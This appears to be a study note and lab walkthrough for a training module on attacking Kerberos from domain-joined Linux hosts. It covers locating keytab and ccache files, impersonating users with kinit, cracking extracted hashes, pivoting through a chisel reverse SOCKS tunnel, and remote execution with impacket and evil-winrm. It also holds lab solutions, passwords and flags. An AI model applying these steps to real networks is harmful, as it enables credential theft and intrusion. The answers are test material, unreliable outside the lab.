# Workflow

#### Intel Gather

1. Check If Linux Machine is Domain Joined
    - Realm utility command `realm list`
    - ps utility command `ps -ef | grep -i "winbind|sssd"`
2. Using Find to Search for Files with Keytab in the Name `find / -name *keytab* -ls 2>/dev/null`
3. Identifying Keytab Files in Cronjobs `crontab -l` it may also show the utility used to interact with kerberos
4. Location of ccache files
    - Check env variable `KRB5CCNAME` for ccache file
    - Another location is /tmp
5. Check the user for which the ccache file is using `klist -k -t`

#### Exploits

> **Note**: `kinit` is **case-sensitive**. Confirm name of principle matches.

> **Note**: Using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, the variable must be modified to only include the path to the ccache file.

1. Spoofing using the keytab file using `kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab`.
2. Crack account password by extracting hashes in the keytab file. Utility for this task [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) it will extract info such as realm, Service Principal, Encryption type and hashes.
    - Use `python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab`
    > **Note**: A keytab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.
    > **Note**: `klist` only displays the ticket info like start and expire date. ccache files are temporary.
    - Use `hashcat` or `johntheripper` to crack the NTLM hash
    - Websites like https://crackstation.net/ can be used for the same purpose
    - After logging in as the user look for more hashes
    - If we gain read privilege on a keytab file. Only the owner of the file or root can read the file.
    - Look for tickets `present in machine`, `who they belong to` and `the expiration time`
    - Use `id` to check the details of the user from the keytab file in the machine
    - To use a ccache file, we can copy the ccache file and assign the file path to the `KRB5CCNAME` variable.
3. To use other linux tools to attack `AD`. We need
    - For a domain-joined machine `KRB5CCNAME` env variable must be set.
    - In case the machine has not joined the domain example the attack box must be able to contact the KDC or the domain controller and Domain Resolution is working.
    - If the attack box cannot establish a connection to KDC/Domain Controller, a proxy must be configured with tools such as [Chisel](https://github.com/jpillora/chisel) and [Proxychains](https://github.com/haad/proxychains) and /etx/hosts must have the target machines and domain ip's hardcoded.
    - Set up proxychains config file to use socks5 and port 1080
    - Execute chisel on the attack box(pwnbox) with `sudo ./chisel server --reverse`
    - From the foothold execute `c:\tools\chisel.exe client <attack_box_ip> R:socks`
    - Using Impacket with proxychains and Kerberos Authentication the target name must be specified not its ip. use the flag `-k` and if password prompt needs to be skipped use `-no-pass`. like `proxychains impacket-wmiexec dc01 -k`
4. To use `evil-winrm`
    - kerberos package called krb5-user must be installed
    - A prompt to set up realm will show up during installation. Provide the domain for the attack
    - if the krb5-user configuration has to be changed the file is at `/etc/krb5.conf`
    - Using Evil-WinRM with Kerberos `proxychains evil-winrm -i dc01 -r inlanefreight.htb`
    - [impacket-ticketconverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) can be used to convert ccache file in windows and kirbi file in linux like `impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi`
    - [Linikatz](https://github.com/CiscoCXSecurity/linikatz) is the tool to use in linux machines connected to the `AD`. To take advantage of it use it in root privileges.


## Lab

Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.

- `ssh -p 2222 david@inlanefreight.htb@<ip>`

Which group can connect to LINUX01? 

- `realm list`

Look for a keytab file that you have read and write access. Submit the file name as a response.

- `find / -type f -name *keytab* 2>/dev/null`

Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory.

- `python3 keytabextractor.py <path_to_file>`
- Use https://www.crackstation.net to crack the NTLM hash

Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory

- `su carlos@inlanefreight.htb`
- Password: Password5
- `crontab -l`
- detected a cronjob of executing a script at `.scripts/kerberos_script_test.sh`
- investigating the script resulted in the discovery of the keytab file for svc_workstations with the name `svc_workstations.kt`
- Extracting hashes with `keytabextractor.py` and decoding it using https://www.crackstation.net/
- `su svc_workstations@inlanefreight.htb`
- Password: Password4
- `cd ~`
- `cat flag.txt`

Check svc_workstation's sudo privileges and get access as root. Submit the flag in /root/flag.txt directory as the response.

- Checking sudoers file for the current account using `sudo -l` resulting in the discovery of the account in the sudoers file
- Switching user to root `sudo su`
- Password: Password4
- Navigate to home directory to find the file

Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\\\DC01\julio.

- As root checking the /tmp directory will result in the discovery of 2 `krb5cc` files belonging to julio@inlanefreight.htb
- Changing environment variable `KRB5CCNAME` to the path of one of these files will result in klist approving as julio
- Using smbclient to interact with the share and retriving the flag 
    `smbclient //dc01/julio`

Use the LINUX01$ Kerberos ticket to read the flag found in \\\\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_). 

- Looking for all the keytab files using find `find / -type f -name *keytab* 2>/dev/null` will result in the discovery of krb5.keytab
- Using `kinit` to use the keytab to spoof as `LINUX01$@INLANEFREIGHT.HTB` 
    `kinit LINUX01$@INLANEFREIGHT.HTB -k -t /etc/krb5.keytab`
- Using smbclient to access the //dc01/linux01 share and retrieve the flag

### Optional exercise

